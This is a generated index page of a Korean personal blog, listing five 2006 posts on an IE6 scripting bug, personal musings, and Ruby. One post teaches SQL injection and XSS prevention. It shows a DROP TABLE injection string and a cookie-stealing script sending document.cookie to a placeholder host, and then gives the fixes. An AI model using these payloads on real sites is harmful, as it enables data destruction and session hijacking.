@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="ko-KR">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=7001&amp;path=livereload" data-no-instant defer></script>
+  
+
+  
+  
+
+
+  <meta charset="utf-8">
+
+
+  <meta name="robots" content="noindex, nofollow, noarchive">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+  
+    
+      <meta name="description" content="bluedskim@gmail.com">
+    
+  
+
+
+<meta name="color-scheme" content="light dark">
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.152.2">
+  <title>Do What You Want | Do What You Want To Do</title>
+  <link href="//localhost:7001/" rel="canonical">
+
+
+
+
+  <link href="alternate" rel="/feed.xml" type="application/rss+xml">
+
+  
+
+
+
+
+  
+  
+    
+    
+  
+  
+
+
+
+
+
+  
+
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+    
+    
+    
+      
+      
+    
+    
+    
+  
+
+
+  
+    <link href="/css/base.css" rel="stylesheet">
+
+    <link href="/css/syntax.css" rel="stylesheet">
+
+
+
+</head>
+
+<body>
+  <nav class="u-background">
+  <div class="u-wrapper">
+    <ul class="Banner">
+      <li class="Banner-item Banner-item--title">
+        
+          <a class="Banner-link u-clickable" href="/">Do What You Want To Do</a>
+        
+      </li>
+      
+        
+        
+        <li class="Banner-item">
+          <a class="Banner-link u-clickable" href="/categories/tech/">Tech</a>
+        </li>
+      
+        
+        
+        <li class="Banner-item">
+          <a class="Banner-link u-clickable" href="/tags/samba/">Samba</a>
+        </li>
+      
+        
+        
+        <li class="Banner-item">
+          <a class="Banner-link u-clickable" href="/categories/%EC%9D%8C%EC%95%85/">음악</a>
+        </li>
+      
+        
+        
+        <li class="Banner-item">
+          <a class="Banner-link u-clickable" href="/categories/%EC%9D%BC%EC%83%81%EC%82%AC/">일상사</a>
+        </li>
+      
+        
+        
+          
+        
+        <li class="Banner-item">
+          <a class="Banner-link u-clickable" href="/feed.xml">RSS</a>
+        </li>
+      
+    </ul>
+  </div>
+</nav>
+
+  <main>
+    <div class="u-wrapper">
+      <div class="u-padding">
+        
+
+  
+    
+    <header class="Heading">
+  <h1 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/" rel="bookmark">Do What You Want</a>
+  </h1>
+  
+</header>
+  
+
+  
+
+
+
+<h1 id="do-what-you-want">
+  <a class="Heading-link u-clickable" href="/#do-what-you-want">Do What You Want</a>
+</h1>
+<p>잡다한 것들을 기록합니다.</p>
+
+
+  
+  
+    <article>
+      
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/posts/software-engineering/%EC%9D%B8%ED%84%B0%EB%84%B7-%EC%9D%B5%EC%8A%A4%ED%94%8C%EB%A1%9C%EB%9F%AC-6.0%EC%97%90%EC%84%9C-html-%EC%97%98%EB%A6%AC%EB%A8%BC%ED%8A%B8%EB%A5%BC-java-script%EC%97%90%EC%84%9C-%EC%B0%B8%EC%A1%B0%ED%95%98%EC%A7%80-%EB%AA%BB%ED%95%98%EB%8A%94-%EA%B2%BD%EC%9A%B0-%EC%9E%88%EC%9D%8C/" rel="bookmark">인터넷 익스플로러 6.0에서 html 엘리먼트를 java script에서 참조하지 못하는 경우 있음</a>
+  </h2>
+  
+    
+      <time datetime="2006-08-31T01:11:00&#43;09:00">August 31, 2006</time>
+    
+  
+</header>
+      
+        
+          
+            <p><span class="copyright_entry" style="display:block;" title="인터넷 익스플로러 6.0에서 html 엘리먼트를 java script에서 참조하지 못하는 경우 있음@@**@@http://shed.egloos.com/1403066"></span>드림위버(버전은 모름, 현재 최신 버전인듯)에서 html 편집을 할 때
+<br>아래와 같이 자동으로 코딩되는 부분이 있음
+<br>
+<br>&lt;!DOCTYPE html PUBLIC &ldquo;-//W3C//DTD XHTML 1.0 Transitional//EN&rdquo; &ldquo;<a href="http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd%22">http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</a>&gt;
+<br>&lt;html xmlns=&ldquo;<a href="http://www.w3.org/1999/xhtml%22">http://www.w3.org/1999/xhtml&quot;</a>&gt;
+<br>
+<br>이 때 인터넷 익스플로러 6.0에서 html 엘리먼트를 java script에서 참조하지 못하는 경우 있음
+<br>
+<br>예를 들어 document.body 를 참조하지 못함!!!!!!!
+<br>
+<br>위의 코드를
+<br>
+<br>&lt;html&gt;
+<br>
+<br>로 변경하니 잘됨. IE의 문제로 보여짐
+<br>
+<br>썅. 6시간 까먹음
+<br></p>
+<!--
+       <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+		    xmlns:dc="http://purl.org/dc/elements/1.1/"
+		    xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+       <rdf:Description
+	        rdf:about="http://shed.egloos.com/1403066"
+	        dc:identifier="http://shed.egloos.com/1403066"
+	        dc:title="인터넷 익스플로러 6.0에서 html 엘리먼트를 java script에서 참조하지 못하는 경우 있음"
+	        trackback:ping="http://shed.egloos.com/tb/1403066"/>
+       </rdf:RDF>
+       -->
+<ul></ul>
+          
+        
+      
+      
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/software-engineering/" rel="tag">Software Engineering</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/posts/%EC%9D%BC%EC%83%81%EC%82%AC/%EC%B2%AB%EC%82%AC%EB%9E%91/" rel="bookmark">첫사랑</a>
+  </h2>
+  
+    
+      <time datetime="2006-08-30T21:30:00&#43;09:00">August 30, 2006</time>
+    
+  
+</header>
+      
+        
+          
+            <p><span class="copyright_entry" style="display:block;" title="첫사랑@@**@@http://shed.egloos.com/1402861"></span>힌트로 뭘 적을까 잠시 고민하다가
+<br>
+<br>갑자기 슬퍼지더라&hellip;
+<br>
+<br>뭐이런 질문이 다있나?
+<br>
+<br></p>
+<div style="text-align:center">
+ <img class="image_mid" border="0" onmouseover="this.style.cursor='pointer'" alt="" src="/attachment/1402861_1.png" width="600" height="552.272727273" onclick="Control.Modal.openDialog(this, event, 'http://pds1.egloos.com/pds/1/200608/30/82/a0003782_2134568.png', 792, 729);">
+</div> 
+<!--
+       <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+		    xmlns:dc="http://purl.org/dc/elements/1.1/"
+		    xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+       <rdf:Description
+	        rdf:about="http://shed.egloos.com/1402861"
+	        dc:identifier="http://shed.egloos.com/1402861"
+	        dc:title="첫사랑"
+	        trackback:ping="http://shed.egloos.com/tb/1402861"/>
+       </rdf:RDF>
+       -->
+<ul></ul>
+          
+        
+      
+      
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/%EC%9D%BC%EC%83%81%EC%82%AC/" rel="tag">일상사</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/posts/software-engineering/%EC%B6%94%EC%96%B5%EC%9D%98-ip/" rel="bookmark">추억의 IP</a>
+  </h2>
+  
+    
+      <time datetime="2006-08-29T20:21:00&#43;09:00">August 29, 2006</time>
+    
+  
+</header>
+      
+        
+          
+            <p><span class="copyright_entry" style="display:block;" title="추억의 IP@@**@@http://shed.egloos.com/1402007"></span>지금 다니는 회사는 인터넷 공유기를 사용해서
+<br>
+<br>직원들에게 공인 IP가 지급되지 않지만
+<br>
+<br>첫직장에서는 공인아이피를 지급했었다.
+<br>
+<br>지금도 가끔 집에서 회사pc로 VNC 접속하려고 할 때 습관적으로 예전 직장의 IP로 접속하려 할 때가 많다.
+<br>
+<br>어이없음에 피식 웃고 말지만
+<br>
+<br>지금 생각해보니
+<br>
+<br>그 아이피가 단순한 숫자가 아니었다는 생각이 든다.
+<br>
+<br>마치 고향집 전화번호 같다. 나와 contact 할 수 있는(있었던 ^^) 기호.
+<br>
+<br>
+<br>&quot; 처음 뵙겠습니다. ^^  저는 아이피 xxx.xxx.15.42를 쓰는 김동석입니다.
+<br>
+<br>하하~ 아이피 번호가 어떻게 되시죠? 혹시 FTP나 웹서버 돌리고 계신가요? 
+<br>
+<br>저는 요새 톰캣돌리고 있습니다. ㅎㅎ 한번 방문해주십시오. 게시판도 있어요~&quot;
+<br>
+<br>
+<br>
+<br>누군가 사용하고 있지 않을까 하는 기대로 ping 날려보는데,, Request Timed Out&hellip;
+<br>
+<br>벌서 퇴근하셨나? 요새 젊은 프로그래머들 못써먹겠군&hellip; ㅋㅋㅋ
+<br>
+<br>
+<br>
+<br></p>
+<div style="text-align:center">
+ <img class="image_mid" border="0" onmouseover="this.style.cursor='pointer'" alt="" src="/attachment/1402007_1.gif" width="509" height="616" onclick="Control.Modal.openDialog(this, event, 'http://pds2.egloos.com/pds/1/200608/29/82/a0003782_2041183.gif', 509, 616);">
+</div> 
+<!--
+       <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+		    xmlns:dc="http://purl.org/dc/elements/1.1/"
+		    xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+       <rdf:Description
+	        rdf:about="http://shed.egloos.com/1402007"
+	        dc:identifier="http://shed.egloos.com/1402007"
+	        dc:title="추억의 IP"
+	        trackback:ping="http://shed.egloos.com/tb/1402007"/>
+       </rdf:RDF>
+       -->
+<ul></ul>
+          
+        
+      
+      
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/software-engineering/" rel="tag">Software Engineering</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/posts/software-engineering/sql-injection--cross-site-scripting-xss-%EC%98%88%EB%B0%A9%EC%B1%85/" rel="bookmark">Sql injection &amp; Cross Site Scripting (XSS) 예방책</a>
+  </h2>
+  
+    
+      <time datetime="2006-08-29T18:56:00&#43;09:00">August 29, 2006</time>
+    
+  
+</header>
+      
+        
+          
+            <p><span class="copyright_entry" style="display:block;" title="Sql injection &amp; Cross Site Scripting (XSS) 예방책@@**@@http://shed.egloos.com/1401958"></span></p>
+<p class="MsoNormal" style=""><b style=""><span style="font-family: 굴림체;" lang="EN-US">&lt; Sql injection&nbsp;&gt;</span></b></p> 
+<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">공격 예제<span lang="EN-US">]</span></span></b></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">Java </span><span style="font-size: 10pt; font-family: 굴림체;">소스의 게시판 검색 <span lang="EN-US">Sql </span>구문 코딩이 아래와 같다고 하고<span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">String findQuery = </span><span style="font-size: 10pt;">“<span lang="EN-US">select * from notice where <b style="">title = '</b></span><b style="">”<span lang="EN-US"> + keyword + </span>“<span lang="EN-US">' </span>“</b><span lang="EN-US"> ;</span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">홈페이지의 게시판 검색 시 <span style="" lang="EN-US">keyword</span><span lang="EN-US"> </span>에<span lang="EN-US"> <br> <br> </span></span><span style="font-size: 10pt;">“<span lang="EN-US"><span style="">&nbsp;&nbsp; </span>any' <span style="">&nbsp;</span>;<span style="">&nbsp; </span>DROP TABLE NOTICE<span style="">&nbsp;&nbsp; </span></span>“</span><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US"><span style="">&nbsp; </span></span><span style="font-size: 10pt; font-family: 굴림체;">를 넣고 검색한다면 <span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">아래와 같은 <span lang="EN-US">Sql </span>구문이 실행되고<span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">SELECT * FROM notice WHERE title = 'any' ;<span style="">&nbsp; </span><b style="">DROP TABLE notice</b></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">NOTICE </span><span style="font-size: 10pt; font-family: 굴림체;">테이블이 삭제됩니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
+<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">예방법<span lang="EN-US">]</span></span></b></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">Sql </span><span style="font-size: 10pt; font-family: 굴림체;">구문을 직접 생성하는 방법을 피하면 됩니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">Java</span><span style="font-size: 10pt; font-family: 굴림체;">의 경우<span lang="EN-US"> Prepared Statement </span>를 이용하면 예방가능합니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">--------------------------------------------------------------------------</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">String findQuery = </span><span style="font-size: 10pt;">“<span lang="EN-US">select * from notice where title = ? </span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US">“</span><span style="font-size: 10pt;" lang="EN-US">;</span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">PreparedStatement pstmt = dbConnection.prepareStatement(findQuery);</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">pstmt.setString(1, keyword);</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">ResultSet rs = pstmt.executeQuery();</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">-----------------------------------------------------------------------</span></p> 
+<p class="MsoNormal" style="margin-left: 40pt; text-align: justify; text-indent: -20pt;"><span style="font-size: 10pt; font-family: Wingdings;" lang="EN-US"><span style="">l<span style="font-family: &amp;quot;Times New Roman&amp;quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-size: 10pt;">참고<span lang="EN-US"> URL <br> http://korea.internet.com/channel/content.asp?kid=18&amp;cid=185&amp;nid=34414</span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
+<p class="MsoNormal" style=""><b style=""><span style="font-family: 굴림체;" lang="EN-US">&lt; Cross Site Scripting&nbsp;(XSS) &gt;<span style="">&nbsp;&nbsp;&nbsp;&nbsp; </span></span></b></p> 
+<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">공격 예제<span lang="EN-US">]</span></span></b></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">아래의 코드가 웹페이지에 삽입되어 있다면<span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">----------------------------------------------------------------</span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">&lt;script&gt;</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">document.location.replace('http://10.1.1.1:8080/</span><span style="font-size: 10pt;" lang="EN-US"> <span style="">getCookie.cgi?'+document.cookie+'&amp;'+document.URL);</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">&lt;/script&gt;</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">---------------------------------------------------------------</span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">페이지를 접속하는 순간에 사용자의 쿠기값들과 현재 페이지<span lang="EN-US"> URL</span>을 </span><span style="font-size: 10pt;" lang="EN-US"><a href="http://10.1.1.1:8080/getCookie.cgi"><span style="font-family: 굴림체;">http://10.1.1.1:8080/getCookie.cgi</span></a></span><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US"> </span><span style="font-size: 10pt; font-family: 굴림체;">로 전송합니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">위의 예 이외에도 여러가지 유형이 있습니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">&nbsp;</span></p> 
+<p class="MsoNormal" style=""><b style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">[</span></b><b style=""><span style="font-size: 10pt; font-family: 굴림체;">예방법<span lang="EN-US">]</span></span></b></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">대부분의<span lang="EN-US"> XSS</span>는 게시판을 통해서 일어나므로<span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">사용자들 게시판에<span lang="EN-US"> html </span>코드를 쓸 수 없게 합니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">이 때<span lang="EN-US"> DB</span>에 게시물을<span lang="EN-US"> Insert </span>시에는 처리할 것이 없습니다<span lang="EN-US">.</span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;" lang="EN-US">DB</span><span style="font-size: 10pt; font-family: 굴림체;">에서 해당 게시물을 조회할 때<span lang="EN-US"></span></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt; font-family: 굴림체;">게시물 내용에서<span lang="EN-US"><span style="">&nbsp; </span></span>“<span lang="EN-US"> &lt; </span>“<span lang="EN-US"><span style="">&nbsp; </span></span>는<span lang="EN-US"><span style="">&nbsp; </span>&amp;lt;<span style="">&nbsp; </span></span>로 변경 하고<span lang="EN-US"><span style="">&nbsp;&nbsp;&nbsp; </span></span>”<span lang="EN-US"> &gt; </span>“ 는<span lang="EN-US"><span style="">&nbsp; </span>&amp;gt; </span>로 변경 해주면 웹브라우져는 악의적인 코드를<span lang="EN-US"> html</span>태그로 인식하지 않으므로 스크립트가 실행되지 않습니다<span lang="EN-US">(</span>화면에는 입력한 대로 출력되어 보이게 됩니다<span lang="EN-US">).</span></span></p> 
+<p class="MsoNormal" style="margin-left: 40pt; text-align: justify; text-indent: -20pt;"><span style="font-size: 10pt; font-family: Wingdings;" lang="EN-US"><span style="">l<span style="font-family: &amp;quot;Times New Roman&amp;quot;; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-size: 10pt;">참고<span lang="EN-US"> URL<br> http://www.zdnet.co.kr/builder/system/security/0,39031673,39131781,00.htm</span></span><span style="font-size: 10pt; font-family: 바탕;" lang="EN-US"></span></p> 
+<p class="MsoNormal" style=""><span style="font-size: 10pt;" lang="EN-US">&nbsp;</span></p> 
+<!--
+       <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+		    xmlns:dc="http://purl.org/dc/elements/1.1/"
+		    xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+       <rdf:Description
+	        rdf:about="http://shed.egloos.com/1401958"
+	        dc:identifier="http://shed.egloos.com/1401958"
+	        dc:title="Sql injection &amp; Cross Site Scripting (XSS) 예방책"
+	        trackback:ping="http://shed.egloos.com/tb/1401958"/>
+       </rdf:RDF>
+       -->
+<ul></ul>
+          
+        
+      
+      
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/software-engineering/" rel="tag">Software Engineering</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/sql/" rel="tag">Sql</a>
+            </li>
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/tags/injection/" rel="tag">Injection</a>
+            </li>
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+      <div class="Divider"></div>
+    
+  
+    <article>
+      
+      <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="/posts/software-engineering/ruby-%EC%96%B8%EC%96%B4%EC%9A%A9-%EC%9B%B9-%EC%9D%B8%ED%84%B0%ED%94%84%EB%A6%AC%ED%84%B0/" rel="bookmark">Ruby 언어용 웹 인터프리터</a>
+  </h2>
+  
+    
+      <time datetime="2006-08-25T19:05:00&#43;09:00">August 25, 2006</time>
+    
+  
+</header>
+      
+        
+          
+            <p><span class="copyright_entry" style="display:block;" title="Ruby 언어용 웹 인터프리터@@**@@http://shed.egloos.com/1399341"></span><a href="http://tryruby.hobix.com/">http://tryruby.hobix.com/</a>
+<br>
+<br>javascript로 Ruby 인터프리터를 구현한줄 알았는데
+<br>
+<br>서버에서 명령실행 결과를 가져오는 거 같다.
+<br>
+<br>그래도 대단함!
+<br>
+<br>역시 스크립트언어!
+<br>
+<br>Python이나 다시 공부해볼까?
+<br>
+<br></p>
+<!--
+       <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+		    xmlns:dc="http://purl.org/dc/elements/1.1/"
+		    xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+       <rdf:Description
+	        rdf:about="http://shed.egloos.com/1399341"
+	        dc:identifier="http://shed.egloos.com/1399341"
+	        dc:title="Ruby 언어용 웹 인터프리터"
+	        trackback:ping="http://shed.egloos.com/tb/1399341"/>
+       </rdf:RDF>
+       -->
+<ul></ul>
+          
+        
+      
+      
+
+  
+
+  
+
+
+
+
+
+  <footer>
+    
+      
+        <ul class="Tags">
+          
+            <li class="Tags-item u-background">
+              <a class="Tags-link u-clickable" href="/categories/software-engineering/" rel="tag">Software Engineering</a>
+            </li>
+          
+        </ul>
+      
+    
+      
+        <ul class="Tags">
+          
+        </ul>
+      
+    
+  </footer>
+
+    </article>
+    
+  
+
+  
+  <nav>
+    
+      <a class="Pagination u-clickable" href="/page/116/" rel="prev">« Previous</a>
+    
+    
+      <a class="Pagination Pagination--right u-clickable" href="/page/114/" rel="next">Next »</a>
+    
+  </nav>
+
+
+
+
+      </div>
+    </div>
+  </main>
+  
+  <footer class="Footer">
+    <div class="u-wrapper">
+      <div class="u-padding u-noboosting">
+        Do What You Want To Do
+      </div>
+    </div>
+  </footer>
+
+</body>
+
+</html>
